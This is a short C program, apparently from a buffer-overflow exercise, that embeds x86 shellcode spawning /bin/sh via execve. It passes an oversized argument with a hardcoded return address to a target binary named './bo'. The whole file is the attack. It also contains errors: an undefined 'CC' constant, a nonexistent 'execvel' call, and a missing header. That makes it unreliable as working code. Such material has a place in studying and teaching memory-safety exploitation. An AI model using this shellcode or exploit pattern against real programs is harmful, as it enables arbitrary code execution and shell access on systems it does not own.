#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <limits.h>
#include <errno.h>

char shellcode[]=
        "\x31\xc0"
        "\50"
        "\x68\x2f\x2f\x73\x68"
        "\x68\x2f\x62\x69\x6e"
        "\x89\xe3"
        "\x50"
        "\x54"
        "\x53"
        "\x50"
        "\x8c\xe0"
        "\x21\xc0"
        "\x74\x04"
        "\xb0\x3b"
        "\xeb\x07"
        "\xb0\x0b"
        "\x99"
        "\x52"
        "\x53"
        "\x89\xe1"
        "\xcd\x80";


int main(int argc , char **argv, char **envp)
{       char *myargv[3];

        myargv[0]= strdup("./bo");
        myargv[2]=0;

        myargv[1]= calloc(1024 , 1);

        memset(myargv[1], 0*CC ,524);
//      strcat(myargv[1], "BBBB");
      strcat (myargv[1],"\x20\xda\xff\xff");

         memcpy(myargv[1], shellcode , strlen(shellcode));

         execvel("./bo",myargv,NULL);
        
         return 0;
}

